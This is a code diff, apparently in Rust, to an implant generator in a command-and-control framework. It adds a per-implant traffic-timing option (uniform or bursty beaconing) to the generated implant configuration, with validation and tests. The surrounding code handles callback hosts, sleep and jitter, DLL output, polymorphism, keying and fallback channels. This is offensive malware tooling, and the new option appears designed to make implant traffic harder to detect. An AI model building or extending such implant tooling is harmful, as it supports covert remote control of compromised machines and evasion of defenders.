@@ -230,6 +230,12 @@ pub struct GenerateRequest {
     /// (`next_fallback_with_bitmap`); operator SetChannel is NOT gated.
     #[serde(default)]
     pub fallback_bitmap: u8,
+    /// Per-implant traffic-timing override (L4). 0 = inherit bake
+    /// (`NYX_PROFILE` `timing_baseline`, default uniform), 1 = uniform,
+    /// 2 = bursty. Unknown values fail-closed HTTP 400. Missing JSON field
+    /// and missing wire tail byte both decode as 0.
+    #[serde(default)]
+    pub timing_baseline: u8,
     /// Features bitmap. See the architecture doc for bit definitions.
     #[serde(default)]
     pub features: u32,
@@ -533,6 +539,7 @@ mod channel_tail_tests {
             tls: true,
             primary_channel: 0,
             fallback_bitmap: 0,
+            timing_baseline: 0,
             features: 0,
             keying: 0,
             expires: None,
@@ -570,6 +577,7 @@ mod channel_tail_tests {
         for i in 0..4 {
             assert_eq!(r.str().unwrap(), "", "channel param string {i}");
         }
+        assert_eq!(r.u8().unwrap(), 0, "timing_baseline inherit");
         assert_eq!(
             r.remaining(),
             0,
@@ -594,6 +602,58 @@ mod channel_tail_tests {
         let err = check_request_fields(&q).unwrap_err();
         assert_eq!(err.0, StatusCode::BAD_REQUEST);
         assert!(err.1.contains("primary_channel"));
+    }
+
+    fn read_timing(blob: &[u8]) -> u8 {
+        let mut r = head(blob);
+        r.u8().unwrap(); // primary_channel
+        r.u8().unwrap(); // fallback_bitmap
+        for _ in 0..4 {
+            r.str().unwrap();
+        }
+        if r.remaining() > 0 {
+            r.u8().unwrap()
+        } else {
+            0
+        }
+    }
+
+    #[test]
+    fn timing_baseline_0_1_2_roundtrip() {
+        for v in [0u8, 1, 2] {
+            let mut q = req();
+            q.timing_baseline = v;
+            let (blob, _) = build_implant_config(&q, [0u8; 32]).unwrap();
+            assert_eq!(read_timing(&blob), v, "timing_baseline {v}");
+        }
+    }
+
+    #[test]
+    fn timing_baseline_unknown_is_rejected() {
+        let mut q = req();
+        q.timing_baseline = 3;
+        let err = check_request_fields(&q).unwrap_err();
+        assert_eq!(err.0, StatusCode::BAD_REQUEST);
+        assert!(err.1.contains("timing_baseline"));
+    }
+
+    #[test]
+    fn timing_baseline_missing_json_field_defaults_to_inherit() {
+        let v: GenerateRequest = serde_json::from_str(
+            r#"{"callback":"10.0.0.1","port":8443,"format":"dll","uri":"/b","sleep":60,"jitter":20,"tls":true}"#,
+        )
+        .unwrap();
+        assert_eq!(v.timing_baseline, 0);
+        let (blob, _) = build_implant_config(&v, [0u8; 32]).unwrap();
+        assert_eq!(read_timing(&blob), 0);
+    }
+
+    #[test]
+    fn timing_baseline_missing_tail_byte_decodes_as_inherit() {
+        // Old generate-implant blobs stop after the four empty spec-1 strings.
+        let (blob, _) = build_implant_config(&req(), [0u8; 32]).unwrap();
+        let truncated = &blob[..blob.len() - 1];
+        assert_eq!(read_timing(truncated), 0);
     }
 }
 
@@ -640,6 +700,7 @@ mod polymorphism_tests {
             tls: true,
             primary_channel: 0,
             fallback_bitmap: 0,
+            timing_baseline: 0,
             features: 0,
             keying: 0,
             expires: None,
@@ -854,6 +915,12 @@ fn check_request_fields(req: &GenerateRequest) -> Result<(), (StatusCode, String
             "primary_channel must be 0-8 (implant Channel enum)".into(),
         ));
     }
+    if req.timing_baseline > 2 {
+        return Err((
+            StatusCode::BAD_REQUEST,
+            "timing_baseline must be 0 (inherit), 1 (uniform), or 2 (bursty)".into(),
+        ));
+    }
     Ok(())
 }
 
@@ -1035,6 +1102,7 @@ fn build_implant_config(
     // Layout: str(callback) | u16(port) | str(uri) | u32(sleep) | u8(jitter) | u8(tls)
     //        | u8(has_token=1) | blob(auth_token 32B)
     //        | u32(features) | u32(keying) | u64(expires_at)
+    //        | spec-1 tail | u8(timing_baseline)
     let mut pw = Writer::new();
     pw.str(&req.callback)
         .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
@@ -1087,6 +1155,10 @@ fn build_implant_config(
         pw.str("")
             .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
     }
+    // L4 optional tail: per-implant timing_baseline (0 inherit / 1 uniform /
+    // 2 bursty). Written unconditionally so every generated config has the
+    // same wire shape; the implant treats a missing byte as 0.
+    pw.u8(req.timing_baseline);
     let config_plaintext = pw.into_bytes();
 
     Ok((config_plaintext, expires_ts))
